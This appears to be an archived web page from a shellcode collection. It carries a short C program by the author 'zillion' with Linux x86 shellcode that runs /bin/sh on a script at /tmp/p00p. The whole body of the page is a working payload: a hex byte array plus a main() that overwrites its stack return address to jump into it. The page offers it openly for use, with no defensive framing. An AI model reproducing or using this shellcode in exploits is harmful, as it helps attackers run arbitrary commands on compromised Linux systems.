<html><head><title>Linux/x86 - execve of /bin/sh /tmp/p00p - 70 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>

Author: zillion
EMail: zillion@safemode.org
Home: http://www.safemode.org


Linux x86 shellcode that does an execve of /bin/sh /tmp/p00p.


File name: execve-tmp-p00p.c


/*
 * This shellcode will do /bin/sh /tmp/p00p ;-)
 * Written by zillion@safemode.org
 *
 */

char shellcode[]=
        &quot;\xeb\x21\x5e\x31\xc0\x88\x46\x07\x88\x46\x11\x89\x76\x12\x8d&quot;
        &quot;\x5e\x08\x89\x5e\x16\x89\x46\x1a\xb0\x0b\x89\xf3\x8d\x4e\x12&quot;
        &quot;\x8d\x56\x1a\xcd\x80\xe8\xda\xff\xff\xff\x2f\x62\x69\x6e\x2f&quot;
        &quot;\x73\x68\x38\x2f\x74\x6d\x70\x2f\x70\x30\x30\x70\x32\x33\x34&quot;
        &quot;\x35\x36\x37\x38\x39\x61\x62\x63\x64\x65&quot;;

int main()
{

  int *ret;
  ret = (int *)&amp;ret + 2;
  (*ret) = (int)shellcode;
}


-- 


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
